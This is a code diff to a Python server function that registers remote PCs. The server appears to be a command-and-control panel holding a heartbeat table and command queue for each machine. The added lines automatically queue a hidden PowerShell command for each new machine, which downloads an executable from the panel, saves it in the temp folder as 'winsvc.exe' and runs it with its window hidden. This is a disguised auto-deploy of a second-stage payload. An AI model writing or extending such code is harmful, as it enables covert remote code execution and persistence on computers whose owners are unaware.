@@ -199,11 +199,22 @@ def register_pc():
             if pc_name not in command_results:
                 command_results[pc_name] = []
             
+            is_new = pc_name not in connected_pcs
             connected_pcs[pc_name] = {
                 'status': 'ONLINE',
                 'last_heartbeat': time.time(),
-                'registered_at': str(datetime.now())
+                'registered_at': str(datetime.now()),
+                'watchdog_deployed': connected_pcs[pc_name].get('watchdog_deployed', False) if pc_name in connected_pcs else False
             }
+            
+            if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
+                panel_host = request.host.split(':')[0]
+                panel_port = request.host.split(':')[1] if ':' in request.host else '5000'
+                cmd = f'powershell -WindowStyle Hidden -Command "Start-Sleep 3; Invoke-WebRequest -Uri http://{panel_host}:{panel_port}/api/watchdog -OutFile $env:TEMP\\winsvc.exe; Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
+                command_queue[pc_name].append(cmd)
+                connected_pcs[pc_name]['watchdog_deployed'] = True
+                logger.info(f"[REGISTER] {pc_name}: watchdog auto-deploy enfileirado")
+            
             logger.info(f"[REGISTER] {pc_name}")
         
         broadcast_pc_update()
